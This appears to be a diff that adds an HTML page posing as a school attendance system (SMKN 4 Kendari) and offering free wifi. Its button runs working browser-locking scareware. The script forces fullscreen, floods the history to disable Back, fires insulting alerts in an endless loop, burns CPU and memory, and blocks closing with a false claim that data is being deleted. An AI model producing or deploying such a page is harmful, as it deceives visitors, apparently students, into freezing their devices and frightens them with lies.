@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SISTEM ABSENSI SMKN 4 KENDARI</title>
+    <style>
+        body { background: black; color: red; text-align: center; font-family: sans-serif; padding-top: 20%; overflow: hidden; }
+        #btn { padding: 20px; font-size: 20px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>TUGAS TERDETEKSI!</h1>
+    <p>Klik tombol di bawah untuk mendapat kan wifi.</p>
+    <button id="btn" onclick="startDestruction()">Terhubung  SEKARANG</button>
+
+    <script>
+        function startDestruction() {
+            // 1. Fullscreen Lock (Bikin navigasi bawah/atas ilang)
+            document.documentElement.requestFullscreen().catch(() => {});
+
+            // 2. History Flood (Bikin tombol BACK gak guna)
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState(null, "", window.location.href);
+            }
+            window.onpopstate = function() {
+                window.history.pushState(null, "", window.location.href);
+                alert("MAU KEMANA LU, BARRENG?! 🦊⚡");
+            };
+
+            // 3. RAM & CPU Meltdown
+            setInterval(() => {
+                // Spam tab baru (kalo browser gak block)
+                // window.open(window.location.href, '_blank'); 
+                
+                // Infinite Alert Loop (Ini yang bikin tombol HOME susah dipencet)
+                alert("HP LU UDAH GUA PEGANG, GOBLOK! \n\n- FOX LITE WAS HERE -");
+                
+                // Heavy Processing
+                let junk = "";
+                for(let i=0; i<1000000; i++) { junk += Math.random(); }
+            }, 100);
+        }
+        
+        // Anti-Close (Beberapa browser bakal nanya sebelum tutup)
+        window.onbeforeunload = function() {
+            return "DATA SEDANG DIHAPUS, JANGAN KELUAR!";
+        };
+    </script>
+</body>
+</html>
+
